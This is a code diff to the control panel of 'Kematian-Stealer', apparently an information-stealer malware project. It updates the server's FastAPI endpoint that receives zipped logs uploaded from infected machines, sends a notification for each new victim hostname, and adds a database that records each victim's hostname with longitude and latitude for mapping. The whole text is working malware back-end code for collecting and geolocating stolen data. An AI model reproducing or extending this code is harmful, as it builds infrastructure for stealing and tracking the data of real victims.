@@ -1,9 +1,8 @@
 import os
 import uuid
 import aiohttp
-import aiosqlite
-import subprocess
 import datetime
+import aiosqlite
 
 from panel.ui.modules.first_time.first_time import MakeFiles
 from panel.ui.modules.notifications.notifications import Notifications
@@ -41,6 +40,7 @@ file_handler.ensure_all_dirs()
 
 db_path = os.path.join(good_dir, "Kematian-Stealer", "kdot.db")
 db_path_graphs = os.path.join(good_dir, "Kematian-Stealer", "graphs.db")
+db_path_map = os.path.join(good_dir, "Kematian-Stealer", "map.db")
 
 api_base_url = "https://sped.lol"
 
@@ -85,11 +85,29 @@ async def initialize_database_graphs():
         await db.commit()
 
 
+async def initalize_database_map():
+    """Initialize the database if it doesn't exist."""
+    async with aiosqlite.connect(db_path_map) as db:
+        await db.execute(
+            """
+            CREATE TABLE IF NOT EXISTS map (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                date TEXT,
+                hostname TEXT,
+                longitude TEXT,
+                latitude TEXT
+            )
+        """
+        )
+        await db.commit()
+
+
 @app.on_event("startup")
 async def on_startup():
     """Startup event to initialize the database."""
     await initialize_database_logs()
     await initialize_database_graphs()
+    await initalize_database_map()
 
 
 @app.post("/data")
@@ -148,11 +166,35 @@ async def receive_data(request: Request, file: UploadFile = File(...)) -> JSONRe
         await db.commit()
 
     out = handler.unzip_file()
-    if out:
-        NOTIFICATIONS.send_notification(f"New log from {info['hostname']}")
-        return JSONResponse(content={"status": "ok"})
-    else:
+
+    if not out:
         return JSONResponse(content={"status": "error"})
+
+    NOTIFICATIONS.send_notification(f"New log from {info['hostname']}")
+    # return JSONResponse(content={"status": "ok"})
+
+    lat_long = handler.get_longitude_latitude()
+
+    if lat_long == (None, None):
+        print(lat_long)
+        return JSONResponse(content={"status": "error"})
+
+    async with aiosqlite.connect(db_path_map) as db:
+        await db.execute(
+            """
+            INSERT OR REPLACE INTO map (date, hostname, longitude, latitude)
+            VALUES (?, ?, ?, ?)
+            """,
+            (
+                info["date"],
+                info["hostname"],
+                lat_long[0],
+                lat_long[1],
+            ),
+        )
+        await db.commit()
+
+    return JSONResponse(content={"status": "ok"})
 
 
 @ui.page("/")
